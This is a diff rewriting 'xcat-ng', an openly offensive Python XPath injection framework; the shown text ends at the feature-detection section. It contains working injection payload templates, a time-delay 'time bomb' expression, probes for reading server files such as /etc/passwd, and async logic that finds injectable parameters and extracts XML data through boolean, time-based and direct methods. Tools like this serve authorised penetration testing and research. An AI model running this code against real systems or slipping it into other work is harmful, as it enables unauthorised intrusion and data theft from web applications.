@@ -1,124 +1,250 @@
 #!/usr/bin/env python3
 """
-xcat-ng  —  Modern XPath Injection Framework
-================================================
-
+xcat-ng  --  Modern XPath Injection Framework
+=================================================
 Usage:
-    python xcat_ng_v3.py run      -r req.txt --true-string "Welcome"
-    python xcat_ng_v3.py shell    -r req.txt --true-string "Welcome"
-    python xcat_ng_v3.py detect   -r req.txt --true-string "Welcome"
-    python xcat_ng_v3.py discover -r req.txt --true-string "Welcome"
+  xcat_ng.py <command> [options]
 
-    # Ручной режим (без Burp-файла):
-    python xcat_ng_v3.py run --url http://host/page --param search --param-value test \
-                              --true-string "Found" --method GET
+Commands:
+  detect      Probe all parameters, identify injection type and server features
+  run         Auto-detect injection, then extract the full XML document
+  shell       Auto-detect injection, then open an interactive XPath shell
+  injections  List all supported injection templates
+
+Use  xcat_ng.py <command> --help  for detailed options.
 """
 
 from __future__ import annotations
 
+import argparse
 import asyncio
+import collections
 import hashlib
 import importlib.util
-import json
 import math
-import os
 import re
-import readline
+import readline  # noqa: F401  (enables history in shell)
 import shlex
 import statistics
 import sys
-from collections import Counter
 from dataclasses import dataclass, field
 from enum import Enum
+from pathlib import Path
 from typing import Any, Callable, Dict, List, Optional, Tuple
 from urllib.parse import parse_qs, urlparse
 
 import difflib
-import argparse
 
 try:
     import httpx
 except ImportError:
-    sys.exit("pip install httpx")
-
-# ─────────────────────────────────────────────
-# CONFIG
-# ─────────────────────────────────────────────
-
-DEFAULT_TIMEOUT   = 15
-DEFAULT_RETRIES   = 3
-BASELINE_SAMPLES  = 5
-DEFAULT_CONCURRENCY = 10
-FAST_MODE_CHARS   = 15
-MISSING_CHAR      = "?"
-
-ASCII_SEARCH_SPACE = (
-    "etaoinshrdlcumwfgypbvkjxqz"
-    "ETAOINSHRDLCUMWFGYPBVKJXQZ"
-    "0123456789_@.-: +./:()!,{}"
-)
-
-# XPath «time-bomb» — вычисляется долго
-TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])])"
-
-# ─────────────────────────────────────────────
-# ENUMS / MODES
-# ─────────────────────────────────────────────
-
-class Mode(str, Enum):
-    SAFE       = "safe"
-    AGGRESSIVE = "aggressive"
-
-class ExtractionMethod(str, Enum):
-    BOOLEAN = "boolean"
-    TIME    = "time"
-    NORMAL  = "normal"
-
-# ─────────────────────────────────────────────
-# UTILS
-# ─────────────────────────────────────────────
-
-def entropy(text: str) -> float:
-    if not text:
-        return 0.0
-    freq: Dict[str, int] = {}
-    for c in text:
-        freq[c] = freq.get(c, 0) + 1
-    e = 0.0
-    n = len(text)
-    for v in freq.values():
-        p = v / n
-        e -= p * math.log2(p)
-    return e
+    sys.exit("[!] Missing dependency: pip install httpx")
 
 
-def profile(text: str) -> dict:
-    return {
-        "len":     len(text),
-        "entropy": entropy(text),
-        "hash":    hashlib.sha256(text.encode(errors="ignore")).hexdigest(),
-    }
+# ══════════════════════════════════════════════════════════════════════════════
+# Terminal colours
+# ══════════════════════════════════════════════════════════════════════════════
+
+class T:
+    RESET   = "\033[0m"
+    BOLD    = "\033[1m"
+    DIM     = "\033[2m"
+    RED     = "\033[91m"
+    GREEN   = "\033[92m"
+    YELLOW  = "\033[93m"
+    BLUE    = "\033[94m"
+    CYAN    = "\033[96m"
+    GRAY    = "\033[90m"
 
 
-def similarity(a: str, b: str) -> float:
-    return difflib.SequenceMatcher(None, a, b).ratio()
-
-
-def _color(text: str, code: int) -> str:
-    """ANSI colour (skipped if not a tty)."""
+def _c(text: str, *codes: str) -> str:
     if not sys.stdout.isatty():
         return text
-    return f"\033[{code}m{text}\033[0m"
+    return "".join(codes) + text + T.RESET
 
-def green(t):  return _color(t, 32)
-def red(t):    return _color(t, 31)
-def yellow(t): return _color(t, 33)
-def cyan(t):   return _color(t, 36)
-def bold(t):   return _color(t, 1)
 
-# ─────────────────────────────────────────────
-# REQUEST PARSING
-# ─────────────────────────────────────────────
+def info(m: str):  print(_c(f"[*] {m}", T.BLUE))
+def ok(m: str):    print(_c(f"[+] {m}", T.GREEN))
+def warn(m: str):  print(_c(f"[!] {m}", T.YELLOW))
+def err(m: str):   print(_c(f"[-] {m}", T.RED))
+
+_verbose = False
+def dbg(m: str):
+    if _verbose:
+        print(_c(f"[DBG] {m}", T.GRAY))
+
+
+BANNER = (
+    _c("""
+ ██╗  ██╗ ██████╗ █████╗ ████████╗      ███╗   ██╗ ██████╗
+ ╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝      ████╗  ██║██╔════╝
+  ╚███╔╝ ██║     ███████║   ██║   █████╗██╔██╗ ██║██║  ███╗
+  ██╔██╗ ██║     ██╔══██║   ██║   ╚════╝██║╚██╗██║██║   ██║
+ ██╔╝ ██╗╚██████╗██║  ██║   ██║         ██║ ╚████║╚██████╔╝
+ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝
+""", T.CYAN, T.BOLD) +
+    _c(" Modern XPath Injection Framework  (v3)\n", T.YELLOW)
+)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Constants
+# ══════════════════════════════════════════════════════════════════════════════
+
+DEFAULT_TIMEOUT     = 15
+DEFAULT_CONCURRENCY = 10
+BASELINE_SAMPLES    = 5
+FAST_MODE_LEN       = 15
+MISSING_CHAR        = "?"
+
+# Frequency-ordered charset: most common English chars first → fewer requests
+CHARSET_FREQ = (
+    "etaoinshrdlcumwfgypbvkjxqz"
+    "ETAOINSHRDLCUMWFGYPBVKJXQZ"
+    "0123456789"
+    "_-. {}@/!#$%^&*()+=[]:;,<>?|'"
+)
+
+# XPath expression that takes a long time to evaluate (used for time detection)
+TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])])"
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Injection templates
+# ══════════════════════════════════════════════════════════════════════════════
+
+@dataclass(frozen=True)
+class Injector:
+    """
+    Wraps an arbitrary XPath condition into a working injection payload.
+      TRUE  response:  pre  + condition + suf
+      FALSE response:  false_pre + "1=2" + false_suf
+    """
+    name:       str
+    example:    str
+    pre:        str
+    suf:        str
+    false_pre:  str = ""
+    false_suf:  str = ""
+
+    def wrap(self, condition: str) -> str:
+        return f"{self.pre}{condition}{self.suf}"
+
+    def false_payload(self) -> str:
+        fp = self.false_pre or self.pre
+        fs = self.false_suf or self.suf
+        return f"{fp}1=2{fs}"
+
+    def true_payload(self) -> str:
+        return self.wrap("1=1")
+
+
+INJECTORS: List[Injector] = [
+    Injector(
+        name="string - single quote",
+        example="/lib/book[name='?']",
+        pre="' or (", suf=") and '1'='1",
+        false_pre="' and (", false_suf=") and '1'='1",
+    ),
+    Injector(
+        name="string - single quote (trailing close)",
+        example="/lib/book[name='?')]",
+        pre="') or (", suf=") and ('1'='1",
+        false_pre="') and (", false_suf=") and ('1'='1",
+    ),
+    Injector(
+        name="string - double quote",
+        example='/lib/book[name="?"]',
+        pre='" or (', suf=') and "1"="1',
+        false_pre='" and (', false_suf=') and "1"="1',
+    ),
+    Injector(
+        name="string - double quote (trailing close)",
+        example='/lib/book[name="?")]',
+        pre='") or (', suf=') and ("1"="1',
+        false_pre='") and (', false_suf=') and ("1"="1',
+    ),
+    Injector(
+        name="integer",
+        example="/lib/book[id=?]",
+        pre="0 or (", suf=") and 1=1",
+        false_pre="0 and (", false_suf=") and 1=1",
+    ),
+    Injector(
+        name="integer (comment)",
+        example="/lib/book[id=?] --",
+        pre="0 or (", suf=") --",
+        false_pre="0 and (", false_suf=") --",
+    ),
+    Injector(
+        name="attribute name - prefix",
+        example="/lib/book[?=value]",
+        pre="1=1 and ", suf="",
+        false_pre="1=2 and ", false_suf="",
+    ),
+    Injector(
+        name="element name - postfix",
+        example="/lib/?something",
+        pre="", suf="[true()]",
+        false_pre="", false_suf="[false()]",
+    ),
+    Injector(
+        name="function call - single quote",
+        example="/lib/something[function(?)]",
+        pre="invalid' or (", suf=") and '1'='1",
+        false_pre="invalid' and (", false_suf=") and '1'='1",
+    ),
+    Injector(
+        name="function call - double quote",
+        example='/lib/something[function(?)]',
+        pre='invalid" or (', suf=') and "1"="1',
+        false_pre='invalid" and (', false_suf=') and "1"="1',
+    ),
+]
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Features
+# ══════════════════════════════════════════════════════════════════════════════
+
+@dataclass(frozen=True)
+class Feature:
+    name:        str
+    test_expr:   str   # XPath that returns true if feature is available
+    description: str = ""
+
+
+FEATURES: List[Feature] = [
+    Feature("xpath-2",               "lower-case('A')='a'",
+            "XPath 2.0 support"),
+    Feature("xpath-3",               "boolean(generate-id(/))",
+            "XPath 3.0 support"),
+    Feature("normalize-space",       "normalize-space(' a b ')='a b'",
+            "normalize-space() available"),
+    Feature("substring-search",      "contains('hello','ell')",
+            "contains() available"),
+    Feature("codepoint-search",      "string-to-codepoints('a')[1]=97",
+            "string-to-codepoints() / XPath 2.0 binary char search"),
+    Feature("environment-variables", "exists(available-environment-variables())",
+            "available-environment-variables()"),
+    Feature("document-uri",          "document-uri(/) != ''",
+            "document-uri() available"),
+    Feature("base-uri",              "base-uri() != ''",
+            "base-uri() available"),
+    Feature("current-datetime",      "string(current-dateTime()) != ''",
+            "current-dateTime() available"),
+    Feature("unparsed-text",         "unparsed-text-available(document-uri(/))",
+            "unparsed-text() / file reading"),
+    Feature("doc-function",          "doc-available(document-uri(/))",
+            "doc() available"),
+    Feature("linux",                 "unparsed-text-available('/etc/passwd')",
+            "Linux OS (readable /etc/passwd)"),
+]
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Request parsing
+# ══════════════════════════════════════════════════════════════════════════════
 
 @dataclass
 class ParsedRequest:
@@ -128,202 +254,84 @@ class ParsedRequest:
     query:   Dict[str, str]
     body:    Dict[str, str]
 
+    @property
+    def all_params(self) -> Dict[str, str]:
+        return {**self.query, **self.body}
+
     @classmethod
     def from_burp(cls, path: str) -> "ParsedRequest":
-        raw   = open(path, "r", errors="ignore").read()
-        lines = raw.splitlines()
+        text  = Path(path).read_text(errors="replace")
+        lines = text.splitlines()
 
-        first = lines[0].split()
-        method, path_qs = first[0], first[1]
+        m = re.match(r"^(\w+)\s+(\S+)\s+HTTP/", lines[0])
+        if not m:
+            sys.exit(f"[-] Cannot parse Burp request line: {lines[0]!r}")
 
+        method, path_qs = m.group(1).upper(), m.group(2)
         headers: Dict[str, str] = {}
         i = 1
         while i < len(lines) and lines[i].strip():
             if ":" in lines[i]:
-                k, v = lines[i].split(":", 1)
+                k, _, v = lines[i].partition(":")
                 headers[k.strip()] = v.strip()
             i += 1
+        raw_body = "\n".join(lines[i + 1:]).strip()
 
-        body_raw = "\n".join(lines[i + 1:]).strip()
-        host     = headers.get("Host", "localhost")
-        scheme   = "https" if "443" in host else "http"
-        full_url = f"{scheme}://{host}{path_qs}"
-
-        parsed = urlparse(full_url)
+        host   = headers.get("Host", "localhost")
+        scheme = "https" if "443" in host else "http"
+        full   = f"{scheme}://{host}{path_qs}"
+        parsed = urlparse(full)
         query  = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
-        body   = {k: v[0] for k, v in parse_qs(body_raw, keep_blank_values=True).items()}
-        base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
 
+        body: Dict[str, str] = {}
+        ct = headers.get("Content-Type", "")
+        if raw_body and "application/x-www-form-urlencoded" in ct:
+            body = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}
+
+        for drop in ("Accept-Encoding", "Content-Length", "If-None-Match"):
+            headers.pop(drop, None)
+
+        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
         return cls(method=method, url=base, headers=headers, query=query, body=body)
 
     @classmethod
-    def from_args(cls, url: str, method: str, params: Dict[str, str],
-                  headers: Dict[str, str], body: Dict[str, str]) -> "ParsedRequest":
+    def from_args(cls, url: str, method: str,
+                  params: Dict[str, str], headers: Dict[str, str],
+                  body: Dict[str, str]) -> "ParsedRequest":
         parsed = urlparse(url)
         query  = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
         query.update(params)
         base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
         return cls(method=method, url=base, headers=headers, query=query, body=body)
 
-    @property
-    def all_params(self) -> Dict[str, str]:
-        return {**self.query, **self.body}
 
-# ─────────────────────────────────────────────
-# INJECTION TEMPLATES
-# ─────────────────────────────────────────────
-
-@dataclass
-class Injector:
-    name:            str
-    example:         str
-    # (payload_template_true, payload_template_false)
-    test_true_tmpl:  str
-    test_false_tmpl: str
-    # template for injecting an XPath expression
-    expr_tmpl:       str  # use {working} and {expression}
-    # OR callable(working, expression) -> str
-    expr_fn:         Optional[Callable[[str, str], str]] = None
-
-    def build(self, working: str, expression: str) -> str:
-        if self.expr_fn:
-            return self.expr_fn(working, expression)
-        return self.expr_tmpl.format(working=working, expression=expression)
-
-    def test_payloads(self, working: str) -> List[Tuple[str, bool]]:
-        return [
-            (self.test_true_tmpl.format(working=working),  True),
-            (self.test_false_tmpl.format(working=working), False),
-        ]
-
-
-INJECTORS: List[Injector] = [
-    Injector(
-        name="integer",
-        example="/lib/book[id=?]",
-        test_true_tmpl="{working} and 1=1",
-        test_false_tmpl="{working} and 1=2",
-        expr_tmpl="{working} and {expression}",
-    ),
-    Injector(
-        name="string - single quote",
-        example="/lib/book[name='?']",
-        test_true_tmpl="{working}' and '1'='1",
-        test_false_tmpl="{working}' and '1'='2",
-        expr_tmpl="{working}' and {expression} and '1'='1",
-    ),
-    Injector(
-        name="string - double quote",
-        example='/lib/book[name="?"]',
-        test_true_tmpl='{working}" and "1"="1',
-        test_false_tmpl='{working}" and "1"="2',
-        expr_tmpl='{working}" and {expression} and "1"="1',
-    ),
-    Injector(
-        name="attribute name - prefix",
-        example="/lib/book[?=value]",
-        test_true_tmpl="1=1 and {working}",
-        test_false_tmpl="1=2 and {working}",
-        expr_fn=lambda w, e: f"{e} and {w}",
-    ),
-    Injector(
-        name="attribute name - postfix",
-        example="/lib/book[?=value]",
-        test_true_tmpl="{working} and not 1=2 and {working}",
-        test_false_tmpl="{working} and 1=2 and {working}",
-        expr_fn=lambda w, e: f"{w} and {e} and {w}",
-    ),
-    Injector(
-        name="element name - prefix",
-        example="/lib/something?/",
-        test_true_tmpl=".[true()]/{working}",
-        test_false_tmpl=".[false()]/{working}",
-        expr_fn=lambda w, e: f".[{e}]/{w}",
-    ),
-    Injector(
-        name="element name - postfix",
-        example="/lib/?something",
-        test_true_tmpl="{working}[true()]",
-        test_false_tmpl="{working}[false()]",
-        expr_fn=lambda w, e: f"{w}[{e}]",
-    ),
-    Injector(
-        name="function call - last string parameter - single quote",
-        example="/lib/something[function(?)]",
-        test_true_tmpl="{working}') and true() and string('1'='1",
-        test_false_tmpl="{working}') and false() and string('1'='1",
-        expr_tmpl="{working}') and {expression} and string('1'='1",
-    ),
-    Injector(
-        name="function call - last string parameter - double quote",
-        example='/lib/something[function(?)]',
-        test_true_tmpl='{working}") and true() and string("1"="1',
-        test_false_tmpl='{working}") and false() and string("1"="1',
-        expr_tmpl='{working}") and {expression} and string("1"="1',
-    ),
-    Injector(
-        name="other elements - last string parameter - double quote",
-        example='/lib/something[function(?) and false()] | //*[?]',
-        test_true_tmpl='{working}") and false()] | //*[true() and string("1"="1',
-        test_false_tmpl='{working}") and false()] | //*[false() and string("1"="1',
-        expr_fn=lambda w, e: f'{w}") and false()] | //*[{e} and string("1"="1',
-    ),
-]
-
-# ─────────────────────────────────────────────
-# FEATURES
-# ─────────────────────────────────────────────
-
-FEATURES = [
-    ("xpath-2",               "lower-case('A')='a'"),
-    ("xpath-3",               "boolean(generate-id(/))"),
-    ("normalize-space",       "normalize-space('  a  b ')='a b'"),
-    ("substring-search",      f"string-length(substring-before('{ASCII_SEARCH_SPACE[:10]}','h'))>0"),
-    ("codepoint-search",      "string-to-codepoints('t')[1]=116"),
-    ("environment-variables", "exists(available-environment-variables())"),
-    ("document-uri",          "document-uri(/)"),
-    ("base-uri",              "base-uri()"),
-    ("current-datetime",      "string(current-dateTime())"),
-    ("unparsed-text",         "unparsed-text-available(document-uri(/))"),
-    ("doc-function",          "doc-available(document-uri(/))"),
-    ("linux",                 "unparsed-text-available('/etc/passwd')"),
-]
-
-# ─────────────────────────────────────────────
-# ATTACK CONTEXT
-# ─────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+# Attack context
+# ══════════════════════════════════════════════════════════════════════════════
 
 @dataclass
 class AttackContext:
-    req:            ParsedRequest
-    target_param:   str
-    match_fn:       Callable[[int, str], bool]   # (status, body) -> bool
-    mode:           Mode
-    concurrency:    int
-    fast_mode:      bool
-    injector:       Optional[Injector]
-    tamper_fn:      Optional[Callable]
-    oob_host:       Optional[str]
-    timeout:        int
-    proxy:          Optional[str]
-
-    features:          Dict[str, bool] = field(default_factory=dict)
-    common_strings:    Counter         = field(default_factory=Counter)
-    common_characters: Counter         = field(default_factory=Counter)
-
-    _client:    Optional[httpx.AsyncClient] = field(default=None, repr=False)
-    _semaphore: Optional[asyncio.Semaphore] = field(default=None, repr=False)
-
-    def __post_init__(self):
-        self._semaphore = asyncio.Semaphore(self.concurrency)
+    req:          ParsedRequest
+    target_param: str
+    match_fn:     Callable[[int, str], bool]
+    concurrency:  int
+    fast_mode:    bool
+    timeout:      int
+    proxy:        Optional[str]
+    injector:     Optional[Injector]          = None
+    tamper_fn:    Optional[Callable]          = None
+    features:     Dict[str, bool]             = field(default_factory=dict)
+    char_freq:    collections.Counter         = field(default_factory=collections.Counter)
+    common_strs:  collections.Counter         = field(default_factory=collections.Counter)
+    _client:      Optional[httpx.AsyncClient] = field(default=None, repr=False)
+    _sem:         Optional[asyncio.Semaphore] = field(default=None, repr=False)
 
     async def start(self):
         proxies = {"all://": self.proxy} if self.proxy else None
         self._client = httpx.AsyncClient(
-            timeout=self.timeout,
-            verify=False,
-            proxies=proxies,
+            timeout=self.timeout, verify=False, proxies=proxies
         )
+        self._sem = asyncio.Semaphore(self.concurrency)
 
     async def close(self):
         if self._client:
@@ -333,968 +341,757 @@ class AttackContext:
     def working_value(self) -> str:
         return self.req.all_params.get(self.target_param, "")
 
-    def inject(self, expression: str) -> str:
+    def inject(self, condition: str) -> str:
         if self.injector:
-            return self.injector.build(self.working_value, expression)
-        return expression
+            return self.injector.wrap(condition)
+        return condition
 
-# ─────────────────────────────────────────────
-# HTTP ENGINE
-# ─────────────────────────────────────────────
+    def has(self, feat: str) -> bool:
+        return self.features.get(feat, False)
+
+    def ordered_charset(self) -> str:
+        seen = sorted(self.char_freq.keys(), key=lambda c: -self.char_freq[c])
+        tail = [c for c in CHARSET_FREQ if c not in self.char_freq]
+        return "".join(seen) + "".join(tail)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# HTTP engine
+# ══════════════════════════════════════════════════════════════════════════════
 
 class Engine:
     def __init__(self, ctx: AttackContext):
         self.ctx = ctx
 
-    async def send_raw(self, overrides: Dict[str, str]) -> Tuple[int, str, float]:
-        """Send a request with parameter overrides. Returns (status, body, elapsed)."""
+    async def _send(self, overrides: Dict[str, str]) -> Tuple[int, str, float]:
+        import random
         ctx = self.ctx
         req = ctx.req
 
         q = dict(req.query)
         b = dict(req.body)
-
         for k, v in overrides.items():
             if k in q:
                 q[k] = v
-            if k in b:
+            else:
                 b[k] = v
+        q["_x"] = str(random.randint(10000, 99999))
 
-        # cache-buster
-        import random
-        q["_xcng"] = str(random.randint(100000, 999999))
-
-        args: Dict[str, Any] = dict(
-            method=req.method,
-            url=req.url,
-            params=q if req.method.upper() in ("GET", "DELETE") else None,
-            data=b if req.method.upper() in ("POST", "PUT", "PATCH") else None,
-            headers=req.headers,
-        )
+        kw: Dict[str, Any] = dict(headers=req.headers)
+        if req.method.upper() in ("GET", "DELETE", "HEAD"):
+            kw["params"] = q
+        else:
+            kw["data"] = {**q, **b} if b else q
 
         if ctx.tamper_fn:
-            ctx.tamper_fn(ctx, args)
+            ctx.tamper_fn(ctx, kw)
 
-        async with ctx._semaphore:
+        async with ctx._sem:
             try:
-                r = await ctx._client.request(**args)
+                r = await ctx._client.request(req.method, req.url, **kw)
                 if r.status_code == 429:
                     await asyncio.sleep(3)
-                    r = await ctx._client.request(**args)
+                    r = await ctx._client.request(req.method, req.url, **kw)
                 return r.status_code, r.text, r.elapsed.total_seconds()
             except Exception as exc:
-                print(f"  [!] Request error: {exc}", file=sys.stderr)
+                dbg(f"Request error: {exc}")
                 return 0, "", 0.0
 
-    async def send_expr(self, xpath_expr: str) -> Tuple[int, str, float]:
-        """Inject an XPath expression into the target parameter."""
-        payload = self.ctx.inject(xpath_expr)
-        return await self.send_raw({self.ctx.target_param: payload})
-
-    async def check(self, xpath_expr: str) -> bool:
-        """Boolean oracle: does the injected expression evaluate to true?"""
-        status, body, _ = await self.send_expr(xpath_expr)
-        return self.ctx.match_fn(status, body)
-
     async def baseline(self) -> Tuple[int, str]:
-        status, body, _ = await self.send_raw({})
-        return status, body
+        st, body, _ = await self._send({})
+        return st, body
 
-# ─────────────────────────────────────────────
-# BASELINE PROFILING
-# ─────────────────────────────────────────────
+    async def send_condition(self, condition: str) -> Tuple[int, str, float]:
+        payload = self.ctx.inject(condition)
+        return await self._send({self.ctx.target_param: payload})
 
-async def build_baseline(engine: Engine, n: int = BASELINE_SAMPLES) -> List[str]:
-    samples = []
-    for _ in range(n):
-        _, body = await engine.baseline()
-        samples.append(body)
-    return samples
+    async def send_payload(self, param: str, payload: str) -> Tuple[int, str, float]:
+        return await self._send({param: payload})
 
-# ─────────────────────────────────────────────
-# AUTO DETECTION: BOOLEAN / TIME / NORMAL
-# ─────────────────────────────────────────────
+    async def check(self, condition: str) -> bool:
+        st, body, _ = await self.send_condition(condition)
+        return self.ctx.match_fn(st, body)
 
-async def detect_injection_type(
-    engine: Engine, param: str, baseline_bodies: List[str]
-) -> Optional[Tuple[ExtractionMethod, Injector]]:
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Utilities
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _entropy(text: str) -> float:
+    if not text:
+        return 0.0
+    freq = collections.Counter(text)
+    n = len(text)
+    return -sum((c / n) * math.log2(c / n) for c in freq.values())
+
+
+def _similarity(a: str, b: str) -> float:
+    return difflib.SequenceMatcher(None, a, b).ratio()
+
+
+def _progress(label: str, done: int, total: int, partial: str):
+    """Live progress bar on stderr — keeps stdout clean for XML output."""
+    bar_w  = 24
+    filled = int(bar_w * done / total) if total else 0
+    bar    = "█" * filled + "░" * (bar_w - filled)
+    line   = (
+        f"\r  {T.GRAY}{label:<22}{T.RESET} "
+        f"[{T.CYAN}{bar}{T.RESET}] {done}/{total}  "
+        f"{T.GREEN}{partial}{T.RESET}"
+    )
+    print(line, end="", flush=True, file=sys.stderr)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Detection (Normal → Boolean → Time)
+# ══════════════════════════════════════════════════════════════════════════════
+
+class ExtractionMethod(str, Enum):
+    NORMAL  = "normal"
+    BOOLEAN = "boolean"
+    TIME    = "time"
+
+
+async def _build_baseline(engine: Engine, n: int = BASELINE_SAMPLES) -> List[str]:
+    results = await asyncio.gather(*[engine.baseline() for _ in range(n)])
+    return [body for _, body in results]
+
+
+async def _try_normal(
+    engine: Engine, param: str, inj: Injector, baseline: List[str]
+) -> Optional[str]:
     """
-    Перебирает все INJECTORS и пробует каждый на param.
-    Возвращает (метод, инжектор) или None.
+    Send a true payload and try to extract data directly from the response.
+    Fastest method — no oracle required.
     """
-    req = engine.ctx.req
-    working = req.all_params.get(param, "")
+    _, body, _ = await engine.send_payload(param, inj.true_payload())
+    _, base    = await engine.baseline()
+
+    for pat in [
+        r"<value[^>]*>([^<]+)</value>",
+        r"<result[^>]*>([^<]+)</result>",
+        r"<text[^>]*>([^<]+)</text>",
+        r"<data[^>]*>([^<]+)</data>",
+        r'"result"\s*:\s*"([^"]+)"',
+        r'"value"\s*:\s*"([^"]+)"',
+        r'"data"\s*:\s*"([^"]+)"',
+    ]:
+        m = re.search(pat, body, re.IGNORECASE)
+        if m:
+            return m.group(1)
+
+    base_lines = set(base.splitlines())
+    extra = [l.strip() for l in body.splitlines()
+             if l.strip() and l.strip() not in base_lines and len(l.strip()) > 3]
+    if extra:
+        return "\n".join(extra[:20])
+
+    return None
+
+
+async def _test_boolean(
+    engine: Engine, param: str, inj: Injector, baseline: List[str]
+) -> bool:
+    """Return True if this injector reliably separates true vs false responses."""
+    _, h_true,  _ = await engine.send_payload(param, inj.true_payload())
+    _, h_false, _ = await engine.send_payload(param, inj.false_payload())
+
+    score = 0
+    if abs(len(h_true) - len(h_false)) > 10:                         score += 1
+    if abs(_entropy(h_true) - _entropy(h_false)) > 0.3:              score += 1
+    if h_true != h_false:                                             score += 1
+    avg_sim_true  = sum(_similarity(b, h_true)  for b in baseline) / len(baseline)
+    avg_sim_false = sum(_similarity(b, h_false) for b in baseline) / len(baseline)
+    if avg_sim_true > avg_sim_false + 0.05:                          score += 1
+
+    dbg(f"  boolean score={score} inj={inj.name!r}")
+    return score >= 2
+
+
+async def _test_time(
+    engine: Engine, param: str, inj: Injector
+) -> Optional[float]:
+    """Return timing threshold if time-based injection confirmed, else None."""
+    bomb = inj.true_payload().replace("1=1", f"1=1 and {TIME_BOMB}>0")
+    false_pl = inj.false_payload()
+
+    true_times, false_times = [], []
+    for _ in range(3):
+        _, _, t = await engine.send_payload(param, bomb)
+        true_times.append(t)
+        _, _, t = await engine.send_payload(param, false_pl)
+        false_times.append(t)
+
+    mean_t = statistics.mean(true_times)
+    mean_f = statistics.mean(false_times)
+    std_f  = statistics.pstdev(false_times) or 0.001
+    z      = (mean_t - mean_f) / std_f
+    dbg(f"  time z={z:.2f} mean_t={mean_t:.2f} mean_f={mean_f:.2f} inj={inj.name!r}")
+    return (mean_t + mean_f) / 2 if z > 3 else None
+
+
+async def detect_injection(
+    engine: Engine, param: str, baseline: List[str]
+) -> Optional[Tuple[ExtractionMethod, Injector, Any]]:
+    """
+    Try all injectors on a single parameter.
+    Detection order: Normal → Boolean → Time.
+    Returns (method, injector, extra) where extra is the normal-extracted
+    value for NORMAL mode, or the timing threshold (float) for TIME mode.
+    """
+    bool_hits: List[Injector] = []
 
     for inj in INJECTORS:
-        payloads = inj.test_payloads(working)
-        if len(payloads) < 2:
-            continue
+        # 1) Normal: fastest, try first
+        val = await _try_normal(engine, param, inj, baseline)
+        if val:
+            dbg(f"  normal hit inj={inj.name!r}")
+            return ExtractionMethod.NORMAL, inj, val
 
-        true_payload,  _ = payloads[0]
-        false_payload, _ = payloads[1]
+        # 2) Boolean: reliable blind extraction
+        if await _test_boolean(engine, param, inj, baseline):
+            bool_hits.append(inj)
 
-        # --- Boolean check ---
-        _, h_true,  _ = await engine.send_raw({param: true_payload})
-        _, h_false, _ = await engine.send_raw({param: false_payload})
+    if bool_hits:
+        return ExtractionMethod.BOOLEAN, bool_hits[0], None
 
-        score = 0
-        if abs(len(h_true) - len(h_false)) > 5:                          score += 1
-        if abs(entropy(h_true) - entropy(h_false)) > 0.3:                score += 1
-        if profile(h_true)["hash"] != profile(h_false)["hash"]:          score += 1
-        sim_true  = sum(similarity(b, h_true)  for b in baseline_bodies) / len(baseline_bodies)
-        sim_false = sum(similarity(b, h_false) for b in baseline_bodies) / len(baseline_bodies)
-        if sim_true > sim_false + 0.07:                                   score += 1
-
-        if score >= 2:
-            print(f"  [+] Boolean injection: {green(inj.name)}")
-            return ExtractionMethod.BOOLEAN, inj
-
-        # --- NORMAL check (true payload returns richer content than baseline) ---
-        avg_base_len = statistics.mean(len(b) for b in baseline_bodies)
-        if len(h_true) > avg_base_len * 1.1:
-            print(f"  [+] Normal (content) injection: {green(inj.name)}")
-            return ExtractionMethod.NORMAL, inj
-
-        # --- Time check ---
-        bomb_payload = true_payload.replace("1=1", f"1=1 and {TIME_BOMB}>0")
-        times_true, times_false = [], []
-        for _ in range(3):
-            _, _, t = await engine.send_raw({param: bomb_payload})
-            times_true.append(t)
-            _, _, t = await engine.send_raw({param: false_payload})
-            times_false.append(t)
-
-        mean_t = statistics.mean(times_true)
-        mean_f = statistics.mean(times_false)
-        std_f  = statistics.pstdev(times_false) or 0.001
-        z      = (mean_t - mean_f) / std_f
-
-        if z > 3:
-            print(f"  [+] Time-based injection: {green(inj.name)}")
-            return ExtractionMethod.TIME, inj
+    # 3) Time: last resort, expensive
+    for inj in INJECTORS:
+        threshold = await _test_time(engine, param, inj)
+        if threshold is not None:
+            return ExtractionMethod.TIME, inj, threshold
 
     return None
 
 
-async def auto_discover(engine: Engine, baseline_bodies: List[str]) -> Optional[Tuple[str, ExtractionMethod, Injector]]:
-    """Перебрать все параметры и найти уязвимый."""
-    all_params = engine.ctx.req.all_params
-    # Эвристическая сортировка: строки без цифр — первыми
-    ranked = sorted(all_params.keys(), key=lambda k: (all_params[k].isdigit(), -len(all_params[k])))
+async def auto_discover(
+    engine: Engine, baseline: List[str]
+) -> Optional[Tuple[str, ExtractionMethod, Injector, Any]]:
+    """Iterate all parameters until an injection point is found."""
+    params = engine.ctx.req.all_params
+    # Prefer string parameters over numeric ones
+    ranked = sorted(params.keys(), key=lambda k: (params[k].isdigit(), -len(params[k])))
 
     for param in ranked:
-        print(f"[*] Probing param: {cyan(param)}")
-        result = await detect_injection_type(engine, param, baseline_bodies)
+        info(f"Probing parameter: {_c(param, T.CYAN)}")
+        result = await detect_injection(engine, param, baseline)
         if result:
-            method, inj = result
-            return param, method, inj
+            method, inj, extra = result
+            return param, method, inj, extra
+
     return None
 
-# ─────────────────────────────────────────────
-# FEATURES DETECTION
-# ─────────────────────────────────────────────
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Feature detection
+# ══════════════════════════════════════════════════════════════════════════════
 
